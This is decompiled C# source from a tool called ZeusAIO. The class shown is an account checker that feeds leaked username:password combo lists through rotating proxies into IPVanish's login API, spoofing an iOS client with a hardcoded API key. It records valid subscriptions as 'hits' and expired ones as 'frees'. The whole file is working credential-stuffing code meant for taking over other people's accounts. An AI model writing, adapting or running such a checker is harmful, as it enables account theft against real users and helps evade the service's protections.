// Decompiled with JetBrains decompiler
// Type: IpVanish.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace IpVanish
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "IPVanishVPN/36386 CFNetwork/1120 Darwin/19.0.0";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = false;
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
              string str1 = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"os\":\"iOS_13_2_3\",\"api_key\":\"185f600f32cee535b0bef41ad77c1acd\",\"client\":\"IPVanishVPN_iOS_3.5.0_36386\",\"uuid\":\"F1D257D2-4B14-4F5B-B68E-B4C74B0F4101\"}";
              string input = httpRequest.Post("https://account.ipvanish.com/api/v3/login", str1, "application/json;charset=UTF-8").ToString();
              if (input.Contains("account_type") || input.Contains("expires_at"))
              {
                string str2 = Regex.Match(input, "account_type\":(.*?),").Groups[1].Value;
                string s1 = Check.UnixTimeStampToDateTime(double.Parse(Regex.Match(input, "sub_end_epoch\":(.*?),").Groups[1].Value)).ToString("dd-MMM-yyyy HH:mm:ss");
                if (DateTime.Parse(s1).Date > DateTime.Now.Date)
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - IPVANISH] " + s[0] + ":" + s[1] + " | Account Type: " + str2 + " | Expires: " + s1, Color.Green);
                  Export.AsResult("/Ipvanish_hits", s[0] + ":" + s[1] + " | Account Type: " + str2 + " | Expires: " + s1);
                  return false;
                }
                ++mainmenu.frees;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[FREE - IPVANISH] " + s[0] + ":" + s[1] + " | Expired", Color.OrangeRed);
                Export.AsResult("/Ipvanish_frees", s[0] + ":" + s[1] + " | Expired");
                return false;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static DateTime UnixTimeStampToDateTime(double unixTimeStamp) => new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc).AddSeconds(unixTimeStamp).ToLocalTime();

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
